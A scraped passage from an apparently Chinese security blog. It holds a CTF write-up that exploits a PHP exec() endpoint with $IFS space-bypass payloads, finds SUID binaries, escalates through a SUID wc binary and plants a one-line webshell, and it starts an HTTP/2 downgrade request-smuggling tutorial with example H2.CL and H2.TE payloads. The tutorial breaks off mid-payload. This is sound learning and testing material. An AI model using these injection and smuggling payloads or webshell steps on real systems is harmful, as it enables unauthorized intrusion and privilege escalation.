class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ConfigLoader</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = [<br>            <span class="hljs-string">&#x27;debug&#x27;</span> =&gt; <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&#x27;mode&#x27;</span> =&gt; <span class="hljs-string">&#x27;production&#x27;</span>,<br>            <span class="hljs-string">&#x27;log_level&#x27;</span> =&gt; <span class="hljs-string">&#x27;info&#x27;</span>,<br>            <span class="hljs-string">&#x27;max_input_length&#x27;</span> =&gt; <span class="hljs-number">100</span>,<br>            <span class="hljs-string">&#x27;min_password_length&#x27;</span> =&gt; <span class="hljs-number">8</span>,<br>            <span class="hljs-string">&#x27;allowed_actions&#x27;</span> =&gt; [<span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;debug&#x27;</span>, <span class="hljs-string">&#x27;generate&#x27;</span>]<br>        ];<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;config[<span class="hljs-variable">$key</span>] ?? <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logLevel</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logLevel</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logLevel = <span class="hljs-variable">$logLevel</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$message</span>, <span class="hljs-variable">$level</span> = <span class="hljs-string">&#x27;info&#x27;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$level</span> === <span class="hljs-variable language_">$this</span>-&gt;logLevel) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[LOG] <span class="hljs-subst">$message</span>\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserManager</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$users</span> = [];<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logger</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addUser</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">5</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Username must be at least 5 characters&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Password must be at least 8 characters&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;users[<span class="hljs-variable">$username</span>] = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$password</span>, PASSWORD_BCRYPT);<br>        <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;User <span class="hljs-subst">$username</span> added&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User <span class="hljs-subst">$username</span> added&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">authenticate</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;users[<span class="hljs-variable">$username</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$this</span>-&gt;users[<span class="hljs-variable">$username</span>])) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;User <span class="hljs-subst">$username</span> authenticated&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User <span class="hljs-subst">$username</span> authenticated&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Authentication failed&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringUtils</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sanitize</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$input</span>, ENT_QUOTES, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generateRandomString</span>(<span class="hljs-params"><span class="hljs-variable">$length</span> = <span class="hljs-number">10</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$x</span> = <span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>, <span class="hljs-title function_ invoke__">ceil</span>(<span class="hljs-variable">$length</span> / <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$x</span>)))), <span class="hljs-number">1</span>, <span class="hljs-variable">$length</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InputValidator</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$maxLength</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$maxLength</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;maxLength = <span class="hljs-variable">$maxLength</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$input</span>) &gt; <span class="hljs-variable language_">$this</span>-&gt;maxLength) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Input exceeds maximum length of <span class="hljs-subst">&#123;$this-&gt;maxLength&#125;</span> characters&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandExecutor</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$logger</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$input</span>, <span class="hljs-string">&#x27; &#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;Invalid input: space detected&quot;</span>);<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No spaces allowed&#x27;</span>);<br>        &#125;<br><br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$input</span>, <span class="hljs-variable">$output</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;logger-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;Result: <span class="hljs-subst">$input</span>&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-variable">$output</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ActionHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$config</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$logger</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$executor</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config</span>, <span class="hljs-variable">$logger</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;config = <span class="hljs-variable">$config</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$logger</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;executor = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommandExecutor</span>(<span class="hljs-variable">$logger</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params"><span class="hljs-variable">$action</span>, <span class="hljs-variable">$input</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$action</span>, <span class="hljs-variable">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;allowed_actions&#x27;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Invalid action&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;run&#x27;</span>) &#123;<br>            <span class="hljs-variable">$validator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputValidator</span>(<span class="hljs-variable language_">$this</span>-&gt;config-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;max_input_length&#x27;</span>));<br>            <span class="hljs-variable">$validationResult</span> = <span class="hljs-variable">$validator</span>-&gt;<span class="hljs-title function_ invoke__">validate</span>(<span class="hljs-variable">$input</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$validationResult</span> !== <span class="hljs-literal">true</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$validationResult</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;executor-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$input</span>);<br>        &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;debug&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Debug mode enabled&quot;</span>;<br>        &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$action</span> === <span class="hljs-string">&#x27;generate&#x27;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Random string: &quot;</span> . <span class="hljs-title class_">StringUtils</span>::<span class="hljs-title function_ invoke__">generateRandomString</span>(<span class="hljs-number">15</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Unknown action&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigLoader</span>();<br>    <span class="hljs-variable">$logger</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;log_level&#x27;</span>));<br><br>    <span class="hljs-variable">$actionHandler</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActionHandler</span>(<span class="hljs-variable">$config</span>, <span class="hljs-variable">$logger</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;input&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$actionHandler</span>-&gt;<span class="hljs-title function_ invoke__">handle</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;action&#x27;</span>], <span class="hljs-variable">$input</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$config</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConfigLoader</span>();<br>    <span class="hljs-variable">$logger</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Logger</span>(<span class="hljs-variable">$config</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-string">&#x27;log_level&#x27;</span>));<br>    <span class="hljs-variable">$userManager</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserManager</span>(<span class="hljs-variable">$logger</span>);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;register&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$userManager</span>-&gt;<span class="hljs-title function_ invoke__">addUser</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$userManager</span>-&gt;<span class="hljs-title function_ invoke__">authenticate</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$logger</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;No action provided, running default logic&quot;</span>);<br>&#125; [LOG] No action provided, running <span class="hljs-keyword">default</span> logic<br></code></pre></td></tr></table></figure><p><img src="/2025/11/06/shell/image-20251109173638469.png"></p><p>这里给了命令执行的口子，结合上面的ActionHandler 类，构造简单的RCE</p><p><img src="/2025/11/06/shell/image-20251109173952535.png"><img src="/2025/11/06/shell/image-20251109174002362.png"></p><p>上述类的构造中 屏蔽了空格，所以用$IFS绕过</p><p><img src="/2025/11/06/shell/image-20251109174228881.png"></p><p>看到有flag，我一开始眼瞎没看到，还用find找了一下</p><p><img src="/2025/11/06/shell/image-20251109174649061.png"></p><p>但是cat却打不开</p><p><img src="/2025/11/06/shell/image-20251109174753292.png"></p><p>查看当前目录下有个docker的文件，CTF出题中，出题人经常在这里调试题目，会有flag相关信息</p><p><img src="/2025/11/06/shell/image-20251109175201447.png"></p><p>chmod命令说明 user用户享有所有权限，那就能解释打不开flag是因为权限不足，接下来就是想办法提权。</p><p>想到当前目录下有一个WC，猜测就是这个文件是突破口，但还是先查找一下有4000权限的文件</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">action</span>=run&amp;input=find<span class="hljs-variable">$IFS</span>/<span class="hljs-variable">$IFS</span>-perm<span class="hljs-variable">$IFS</span>-<span class="hljs-number">4000</span><br><span class="hljs-attr">action</span>=run&amp;input=find<span class="hljs-variable">$IFS</span>-perm<span class="hljs-variable">$IFS</span>-<span class="hljs-number">4000</span><br></code></pre></td></tr></table></figure><p>都查到了wc<img src="/2025/11/06/shell/image-20251109175845278.png"></p><p>接下来就是提权，在[GTFOBins](<a href="https://gtfobins.github.io/#+limited">https://gtfobins.github.io/#+limited</a> suid)查找一下wc，看到了SUID提权部分</p><p><img src="/2025/11/06/shell/image-20251109180027019.png"></p><p>尝试直接在URL输入但是没回显，可能是不是标准输出？</p><p><img src="/2025/11/06/shell/image-20251109180651051.png"></p><p>暂时不知道为什么，反弹shell看看。写一句话🐎进去，</p><p><img src="/2025/11/06/shell/image-20251109181757154.png"></p><p>连上蚁剑，利用带有4000权限的wc提权  读取文件</p><p><img src="/2025/11/06/shell/image-20251109182150144.png"></p><p>果然是报错形式回显，因为wc命令是<strong>从指定文件（<code>$LFILE</code>）中读取 “以空字符（<code>\0</code>）分隔的文件名列表”，然后统计这些文件的行数 &#x2F; 字数</strong>。但flag下没有文件</p></details></li></ol>]]></content>
    
    
    <categories>
      
      <category>渗透/挖洞/攻击</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTFs_For_Facing</title>
    <link href="/2025/11/05/CTFs-For-Facing/"/>
    <url>/2025/11/05/CTFs-For-Facing/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP2请求走私</title>
    <link href="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
    <url>/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
    
    <content type="html"><![CDATA[<blockquote><p><em>上一篇<a href="https://i4g5d.github.io/2025/10/31/HTTP1%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">基于HTTP&#x2F;1.1的请求走私</a>能应付目前一些工作，但现在很多HTTP&#x2F;2，这一篇记录偏向实战的HTTP请求走私2.0实践。</em></p></blockquote><h1 id="HTTP请求走私2-0"><a href="#HTTP请求走私2-0" class="headerlink" title="HTTP请求走私2.0"></a>HTTP请求走私2.0</h1><h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><blockquote><p>到2.0，就要先补一下1.0没细看的知识，在1.0中，我都是抓包后把协议换成HTTP&#x2F;1.1，这里看看为什么</p></blockquote><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102163326067.png" alt="image-20251102163326067"></p><p>HTTP&#x2F;1.1</p><ul><li>引入了长TCP连接，在一次TCP连接后不断开连接，所有HTTP报文都必须是持久的，除非特意加上<code>Connection: close</code>，但实际中很多服务器和浏览器还保留着<code>Connection: keep-alive</code>。</li><li>可以在1个TCP连接中发送多个请求</li><li>引入TE和CL</li></ul><p>HTTP&#x2F;2</p><ul><li><p>基于基于 <strong>二进制帧（binary frame）协议</strong>，不再靠请求头决定请求长度。每个 HTTP&#x2F;2 请求被编码为一组帧（Frame）：</p><ul><li><p>HEADERS frame（包含请求头）</p></li><li><p>DATA frame（包含请求体）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">+-----------------------------------------------+<br>|                 Length (24)                   |<br>+---------------+---------------+---------------+<br>|   Type (8)    |   Flags (8)   |<br>+---------------+---------------+---------------+<br>|R|           Stream Identifier (31)            |<br>+=+=============================================+<br>|                  Frame Payload                |<br>+-----------------------------------------------+<br></code></pre></td></tr></table></figure></li></ul><p>每个帧有明确的长度字段，整个请求都是独立而精致单元，所以HTTP&#x2F;2不存在“歧义的请求结束位置问题”</p></li></ul><h2 id="H2走私原理："><a href="#H2走私原理：" class="headerlink" title="H2走私原理："></a>H2走私原理：</h2><blockquote><p>HTTP&#x2F;2引入强大的二进制frame机制解决传统的HTTP请求走私，理论上，只要网站全程使用 HTTP&#x2F;2，这种机制就意味着攻击者没有机会引入请求走私所需的歧义。但HTTP&#x2F;2 降级现象极其普遍，甚至成为许多流行反向代理服务的默认行为。在某些情况下，甚至没有禁用此功能的选项。H2的所有走私都基于降级（后端解析HTTP&#x2F;1.1）</p></blockquote><h3 id="HTTP-2降级："><a href="#HTTP-2降级：" class="headerlink" title="HTTP&#x2F;2降级："></a>HTTP&#x2F;2降级：</h3><p>由于 HTTP&#x2F;2 仍相对较新，支持它的 Web 服务器通常仍需与仅支持 HTTP&#x2F;1 的传统后端基础设施通信。因此前端会把HTTP&#x2F;2和重写为HTTP&#x2F;1语法，将降级后的请求发给相应后端</p><p><img src="/2025/11/02/HTTP2%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/image-20251102163033887.png" alt="image-20251102163033887"></p><p>而后端的响应也会重新翻译成HTTP&#x2F;2返回。而我们的BURP工具使我们能<a href="https://portswigger.net/burp/documentation/desktop/http2/http2-normalization-in-the-message-editor">使用 HTTP&#x2F;1 语法在消息编辑器中显示 HTTP&#x2F;2 消息</a>。</p><h3 id="H2-CL"><a href="#H2-CL" class="headerlink" title="H2.CL"></a>H2.CL</h3><p>（实验1）</p><ul><li>当某个前端&#x2F;代理把一个 H2 请求<strong>降级为 HTTP&#x2F;1.1</strong>转发给后端时，它必须 <strong>合成</strong>一个 <code>Content-Length</code>，这个合成值应当等于 H2 DATA 的实际字节长度。</li><li>但漏洞就在于前端有时会直接沿用 HTTP&#x2F;2 中 <strong>由客户端在 HEADERS 里包含的 <code>content-length</code> 字段</strong>（即把客户端在 header-block 中写的 content-length 直接复制到转成的 HTTP&#x2F;1.1 请求），而未验证是否与实际DATA帧长度一致</li><li>那攻击者就可以在 H2 header-block 放入<strong>误导性的 content-length</strong>，从而在后端造成解析差异（前端按实际 H2 长度解析并结束请求，后端按被注入的 CL 继续等待&#x2F;读取多字节），导致走私。</li></ul><p>总结一下就是 利用前端按H2解析而后端解析H1.1，然后在前端加上一个CL表头，在降级过程中盲目信任这个CL，后端就会直接以这个为准而不是直接去算长度。</p><p><strong>Front-end (HTTP&#x2F;2)</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http">:method  POST<br>:path    /example<br>:authority vulnerable-website.com<br>content-type application/x-www-form-urlencoded<br>content-length 0      &lt;-- 攻击者注入CL<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10<br><br><span class="language-abnf"><span class="hljs-attribute">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure><p>后端转化为(<strong>Back-end (HTTP&#x2F;1)</strong>)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><br><span class="language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com</span><br><span class="language-http"><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>10</span><br><span class="language-http"></span><br><span class="language-http"><span class="language-abnf"><span class="hljs-attribute">x</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>GET / H........</span></span><br><span class="language-abnf"><span class="language-http"></span></span><br></code></pre></td></tr></table></figure><h3 id="H2-TE"><a href="#H2-TE" class="headerlink" title="H2.TE"></a>H2.TE</h3><p>（见实验3）</p><p> <code>transfer-encoding</code>的<code>chunked</code>和HTTP&#x2F;2不兼容，RFC规范会移除注入的TE或者直接拒绝请求。</p><p>但规范只是规范，有些前端不一定做到了，如果把TE降级带到支持HTTP&#x2F;1.1的TE的后端，就会造成H2.TE</p><p><strong>Front-end (HTTP&#x2F;2)</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http">:method  POST<br>:path    /example<br>:authority vulnerable-website.com<br>content-type application/x-www-form-urlencoded<br>transfer-encoding chunked               &lt;-- 攻击者注入TE<br><br>0<br><br><span class="hljs-keyword">GET</span> <span class="hljs-string">/admin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Foo</span><span class="hljs-punctuation">: </span>bar<br></code></pre></td></tr></table></figure><p><strong>Back-end (HTTP&#x2F;1)</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/example</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>vulnerable-website.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-nix"><span class="hljs-number">0</span></span><br><span class="language-nix"></span><br><span class="language-nix">GET <span class="hljs-symbol">/admin</span> HTTP<span 